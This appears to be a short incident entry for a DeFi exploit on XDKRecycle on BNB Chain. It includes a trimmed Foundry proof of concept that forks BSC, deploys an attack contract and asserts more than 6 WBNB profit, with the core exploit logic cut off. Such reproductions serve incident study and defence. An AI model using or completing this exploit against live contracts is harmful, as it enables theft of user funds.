# [?] XDKRecycle - XDK recycle reserve manipulation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: XDKRecycle
Published: 2026-02-16
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-02/XDKRecycle_exp.sol
Type: defi-exploit-poc

## Details
Lost: 6.84 WBNB

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 81_556_795;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = WBNB_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(XDK, "XDK");
        vm.label(GPC, "GPC");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(XDK_GPC_PAIR, "Pancake XDK/GPC Pair");
        vm.label(WBNB_GPC_PAIR, "Pancake WBNB/GPC Pair");
        vm.label(PANCAKE_ROUTER, "Pancake Router");
    }

    function testExploit() public balanceLog {
        uint256 beforeBalance = IERC20(WBNB_TOKEN).balanceOf(ATTACKER);

        vm.startPrank(ATTACKER);
        XDKRecycleAttack attack = new XDKRecycleAttack(ATTACKER);
        attack.attack();
        vm.stopPrank();

        uint256 profit = IERC20(WBNB_TOKEN).balanceOf(ATTACKER) - beforeBalance;
        assertGt(profit, 6 ether);
    }
}

contract XDKRecycleAttack is IPancakeCallee {
    IXDK private constant xdk = IXDK(XDK);
    IERC20 private constant gpc = IERC20(GPC);
    IERC20 private constant wbnb = IERC20(WBNB_TOKEN);
    IPancakePair private constant xdkGpcPair = IPancakePair(XDK_GPC_PAIR);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-02/XDKRecycle_exp.sol_
